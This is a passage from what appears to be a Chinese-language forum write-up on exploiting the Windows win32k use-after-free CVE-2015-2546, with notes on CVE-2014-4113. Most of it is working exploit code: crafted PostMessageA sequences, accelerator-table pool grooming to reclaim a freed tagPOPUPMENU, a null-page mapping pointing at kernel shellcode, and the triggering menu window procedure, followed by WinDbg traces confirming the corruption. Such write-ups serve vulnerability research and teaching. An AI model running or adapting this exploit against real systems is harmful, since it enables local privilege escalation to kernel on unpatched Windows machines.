
```
int __stdcall xxxHandleMenuMessages(int a1, int a2, WCHAR UnicodeString)

{

  uMsg = *(_DWORD *)(a1 + 4);

  if ( uMsg > 0x104 )

  {

    if ( uMsg > 0x202 )

    {

    }

    if ( uMsg == 0x202 )

      goto LABEL_80;

    v20 = uMsg - 0x105;			// uMsg - 0x105

    if ( v20 )

    {

      v21 = v20 - 1;			// uMsg - 0x1		        

      if ( v21 )

      {

        v22 = v21 - 0x12;		// uMsg - 0x12

        if ( !v22 )

          return 1;

        v23 = v22 - 0xE8;		// uMsg - 0xE8

        if ( v23 )			

        {

          if ( v23 == 1 )

          {

	           // CVE-2014-4113漏洞触发点

            iRet = (_DWORD *)xxxMNFindWindowFromPoint((WCHAR)v3, (int)&UnicodeString, (int)v7);

            

            if ( iRet == (_DWORD *)-1 )

              xxxMNButtonDown(v3, v12, UnicodeString, 1);

            else

              xxxSendMessage(iRet, 0xED, UnicodeString, 0);

            if ( !(v12[1] & 0x100) )

              xxxMNRemoveMessage(*(_DWORD *)(a1 + 4), 516);

          }

          return 0;

        }

	

	       // CVE-2015-2546漏洞触发点

        xxxMNMouseMove((WCHAR)v3, a2, (int)v7);

        return 1;

      }

    }

  }

  return 1;

}
```

经过计算，`uMsg`等于`0x201`的时候，会触发CVE-2014-4113的漏洞，当它等于`0x200`的时候会触发CVE-2015-2546的漏洞。而`uMsg`的值是由主窗口处理例程中的第三个`PostMessageA`的第二个参数决定的，根据以下的定义可以知道，本次漏洞的触发需要通过`PostMessageA`发送`WM_MOUSEMOVE`的消息。

```
#define WM_MOUSEMOVE                   0x0200

#define WM_LBUTTONDOWN                  0x0201
```

并且，在进入`xxxMouseMove`函数中，会对第三个`PostMessageA`的第四个参数进行判断，该值如果为0，将不会调用`xxxMNHideNextHierarchy`触发漏洞，所以此次的exp的主窗口例程的处理函数应该改成如下的代码：

```
LRESULT CALLBACK WndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)

{

	if (uMsg == WM_ENTERIDLE)

	{

		if (!bFlag)

		{

			bFlag = TRUE;

			PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, 0);

			PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, 0);

			PostMessageA(hWnd, WM_MOUSEMOVE, 0, 1);

		}

		else

		{

			PostMessageA(hWnd, WM_CLOSE, 0, 0);

		}

	}



	return DefWindowProcA(hWnd, uMsg, wParam, lParam);

}
```

根据上面的漏洞分析可以知道，要成功调用`xxxMNHideNextHierachy`函数触发漏洞，需要对`0x1E5`、`0x1EB`和`0x1F0`这三个消息进行处理。对于`0x1E5`，只需要返回`0x10`就符合要求，而`0x1EB`需要返回一个合法的窗口对象来绕过`IsWindowBeingDestory`函数。因此，需要通过`CreateWindowsExA`创建一个类名为`"#32768"`的窗口对象，函数会返回一个合法的`tagMENUWND`的窗口对象，当处理`0x1EB`消息的时候，将该对象返回回去就可以绕过验证。

有了`tagMENUWND`对象，接下来就需要在`0x1F0`中想办法修改`tagMENUWND`对象的`tagPOPMENU`中偏移`0xC`的`spwndNextPopup`。因为，在函数`xxxMNHideNextHierarchy`中，会对这个成员判断其值是否为0，如果不为0，才会将其作为第一个参数传给`xxxSendMessage`函数，而上面所创建的类名为`"#32768"`的`tagMENUWND`对象的`tagPOPMENU`中的`spwndNextPopup`为0。

想要将其修改为非0值，此处需要使用到`CreateAcceleratorTable`来创建加速表对象，该函数的定义如下：

```
HACCEL CreateAcceleratorTable(LPACCEL lpaccl, 

                int cEntries);
```

其中第二个参数指定了要创建加速表对象的个数，这里需要指定为`0x5`，因此每个加速表对象占8字节，`5 * 8 = 0x28`，再加上8字节的`POOL_HEADER`以及`0x10`字节的对象头，这样可以保证创建的空间足够容纳`0x40`大小的`tagPOPUPMENU`结构体。因此，消息`0x1EB`的执行内容如下：

- 先销毁掉`"#32768"`窗口对象，这样会释放掉`tagPOPUPMENU`的空间
- 申请一些的加速表对象，这些加速表对象就会占用刚刚释放`"32768"`窗口对象的`tagPOPUPMENU`空间，这样，就可以修改`tagPOPUPMENU`中的`spwndNextPopup`

为了避免内存块合并，在初始化阶段，需要首先耗尽`0x40`大小的内存块。然后申请一批连续的`0x40`大小的加速表对象，释放掉其中的偶数部分的加速表对象，这样创建的`"32768"`窗口对象的`tagPOPUPMENU`的空间就会在在这些释放的内存块中。而它的前后两块都是正在被使用的内存块，当在消息`0x1EB`中释放`tagPOPUPMENU`的时候，不会发生内存块的合并。因此，最终的初始化函数应当修改为如下：

```
BOOL Init_2015_2546()

{

	BOOL bRet = TRUE;

	LPACCEL lpAccel = NULL;

	DWORD  i = 0;

	HACCEL hAccel[ACCELERATOR_NUMBER + 5];



	// 消耗掉0x40大小的内存块

	for (i = 0; i < ACCELERATOR_NUMBER; i++)

	{

		lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 5);

		if (!CreateAcceleratorTable(lpAccel, 0x5))

		{

			ShowError("CreateAcceleratorTable", GetLastError());

			bRet = FALSE;

			goto exit;

		}

	}



	// 分配连续的0x40大小的加速表对象

	for (i = 0; i < ACCELERATOR_NUMBER; i++)

	{

		lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 5);

		hAccel[i] = CreateAcceleratorTable(lpAccel, 0x5);

		if (!hAccel[i])

		{

			ShowError("CreateAcceleratorTable", GetLastError());

			bRet = FALSE;

			goto exit;

		}

	}



	// 释放其中的双数的内存块

	for (i = 1; i < ACCELERATOR_NUMBER; i += 2)

	{

		if (!DestroyAcceleratorTable(hAccel[i]))

		{

			ShowError("CreateAcceleratorTable", GetLastError());

			bRet = FALSE;

			goto exit;

		}

	}



	// 创建窗口对象，该窗口的tagPOPMENU会占用上面释放的双数的内存块

	g_hWnd = CreateWindowExA(0,

							 "#32768",

						     NULL,

							 0,

							 -1, -1,

							 0, 0,

							 NULL,

							 NULL,

							 NULL,

							 NULL);



	if (!g_hWnd)

	{

		ShowError("CreateWindowExA #32768", GetLastError());

		bRet = FALSE;

		goto exit;

	}



	if (!SetWindowLongA(g_hWnd, GWL_WNDPROC, (ULONG)DefaultMenuProc_2015_2546))

	{

		ShowError("SetWindowLongA", GetLastError());

		bRet = FALSE;

		goto exit;

	}



	// 在0地址申请内存成功

	if (!AllocateZeroMemory())

	{

		bRet = FALSE;

		goto exit;

	}



	*(DWORD*)(0xD) = GetPtiCurrent_2015_2546();

	*(BYTE*)(0x1B) = (BYTE)4;

	*(DWORD*)(0x65) = (DWORD)ShellCode_2015_2546;	



exit:

	return bRet;

}
```

菜单窗口的处理例程，则应该如下所示：

```
LRESULT CALLBACK MenuWndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)

{

	LPACCEL	lpAccel = NULL;



	if (uMsg == 0x1EB)

	{

		return (LONG)g_hWnd;

	}

	else if (uMsg == 0x1F0)

	{

		if (g_hWnd != NULL)

		{

			// #32768窗口进行销毁,tagPopupMenu被释放

			if (!DestroyWindow(g_hWnd))

			{

				ShowError("DestroyWindow", GetLastError());

			}



			// 使用加速表对象占用窗口对象的空间

			for (DWORD i = 0; i < ACCELERATOR_NUMBER; i++)

			{

				lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 0x5);

				if (lpAccel) CreateAcceleratorTable(lpAccel, 0x5);

			}

		}

		

		return 0;

	}

	else if (uMsg == 0x1E5)

	{

		return 0x10;

	}



	return CallWindowProcA(g_lpPrevWndFunc, hWnd, uMsg, wParam, lParam);

}
```

# 四、运行结果

参考下面链接的师傅的代码写的exp，链接在：[**230K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5#2i4K6u0V1x3U0f1@1y4W2)9J5k6h3y4H3M7l9`.`.**](https://bbs.kanxue.com/elink@7f5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3N6W2L8X3c8e0j5h3u0W2M7W2)9J5c8X3g2^5M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2P5s2m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5#2i4K6u0V1x3U0f1@1y4W2)9J5k6h3y4H3M7l9`.`.)。

在`xxxMNMouseMove`函数中下断点，运行exp，当运行到发送`0x1F0`的消息时，此时可以看到`#32768`窗口对象的`tagPOPUPMENU`中偏移`0xC`的`spwndNextPopup`为0

```
1: kd> p

win32k!xxxMNMouseMove+0x141:

96809530 57              push    edi

1: kd> p

win32k!xxxMNMouseMove+0x142:

96809531 57              push    edi

1: kd> p

win32k!xxxMNMouseMove+0x143:

96809532 68f0010000      push    1F0h

1: kd> p

win32k!xxxMNMouseMove+0x148:

96809537 56              push    esi

1: kd> p

win32k!xxxMNMouseMove+0x149:

96809538 e86000f8ff      call    win32k!xxxSendMessage (9678959d)

1: kd> r esi

esi=fea11b28

1: kd> dd fea11b28 + B0

fea11bd8  fd5ee588 00000000 0001000d 0c000018

fea11be8  00000000 c159c159 00000000 88427a60

1: kd> dt tagPOPUPMENU fd5ee588

win32k!tagPOPUPMENU

   +0x000 flags            : 0x00000000 

   +0x004 spwndNotify      : (null) 

   +0x008 spwndPopupMenu   : 0xfea11b28 tagWND

   +0x00c spwndNextPopup   : (null) 

   +0x010 spwndPrevPopup   : (null) 

   +0x014 spmenu           : (null) 

   +0x018 spmenuAlternate  : (null) 

   +0x01c spwndActivePopup : (null) 

   +0x020 ppopupmenuRoot   : (null) 

   +0x024 ppmDelayedFree   : (null) 

   +0x028 posSelectedItem  : 0xffffffff

   +0x02c posDropped       : 0
```

同时，查看这个时候的内存情况，`tagPOPMENU`对象在两块被使用的加速表对象中间，此时释放它不会造成内存块的合并

![](https://bbs.kanxue.com/upload/attach/202203/835440_MN252MZ2ENX3NQT.jpg)

调用`xxxSendMessage`发送`0x1F0`的消息后，可以看到`spwndNextPopup`被修改为`0x5`。
